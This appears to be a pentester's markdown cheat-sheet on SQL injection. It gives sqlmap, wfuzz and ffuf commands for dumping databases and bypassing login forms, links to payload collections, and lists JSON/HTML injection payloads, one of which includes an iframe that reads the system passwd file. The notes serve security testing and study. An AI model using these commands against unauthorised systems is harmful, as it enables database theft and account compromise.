# SQL Injection

- [SQL Injection](#sql-injection)
  - [SQLMaps](#sqlmaps)
    - [SQLMap Level](#sqlmap-level)
    - [SQLmap WebSocket](#sqlmap-websocket)
    - [SQLmap Cheatsheet](#sqlmap-cheatsheet)
  - [Login forms](#login-forms)
    - [Json injection](#json-injection)
  - [Any forms](#any-forms)
    - [Json injection](#json-injection-1)

## SQLMaps

SQLMap can be used to detect SQL Injection.

```bash
sqlmap -u "http://<URL>/" --batch --dump --forms
```

### SQLMap Level

- level 1: By default
- level 2: Test HTTP Cookie header
- level 3: Test HTTP User-Agent/Referer headers 

### SQLmap WebSocket

https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

### SQLmap Cheatsheet

> https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

## Login forms

Techniques and tools used to bypass login forms using SQL Injection. The wordlist can be found [here](./files/sqli_login_form.txt). It is taken from HackTricks.

> **SQL Login Bypass**
> Hacktricks: https://book.hacktricks.xyz/pentesting-web/login-bypass
> PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
> **NoSQL Login Bypass**
> Hacktricks: https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass

**Using wfuzz**

Keyword `FUZZ` is used to determine the parameter that will be used.

```bash
wfuzz -c -z file,sqli.req -d "username=FUZZ&password=pass" -u "http://<IP>/login"
```

Useful options
- `-H`: Used to set custom header
- `--hc/hl/hw/hh`: Hide responses with the specified code/lines/words/chars
- `--sc/sl/sw/sh`: Show responses with the specified code/lines/words/chars
- `-d`: request datas

**Using ffuf**

```bash
ffuf -u http://<URL>/login -c -w sqli.req -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'
```

Useful options
- `-H`: Used to set custom header
- `-d`: request datas

**Using SQLmap**

Load a file with `-r` option.

```bash
sqlmap -r sqli.req -u "http://<URL>/login" --data "username=admin&password=pass"
```

### Json injection

1. Replace content-type: `Content-Type: application/json`
2. Send json payload: https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass

## Any forms

### Json injection

```bash
"user":"<a href='http\\\\:someurl.com'>ACTIVATE USER HERE</a>"
"user":"<img src=https\\://dummyimage.com/200x200/ff00d5&text=HAHAHA/>"
"title":"<iframe src=file:///ect/passwd height=800px width=600px></iframe>"
```

> **JSON Injection:** https://lisandre.com/archives/2286
